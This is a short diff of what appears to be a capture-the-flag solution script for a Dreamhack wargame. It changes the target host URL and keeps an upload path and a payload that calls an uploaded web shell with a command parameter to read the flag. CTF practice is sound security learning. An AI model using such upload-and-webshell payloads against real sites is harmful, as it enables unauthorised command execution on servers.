@@ -1,7 +1,7 @@
 from bs4 import BeautifulSoup
 import requests
 
-URL = "http://host1.dreamhack.games:21140/"
+URL = "http://host1.dreamhack.games:13542"
 UP_URI = "/upload.php"
 PAYLOAD = "/upload/simple_webshell.html?cmd=/flag"
 
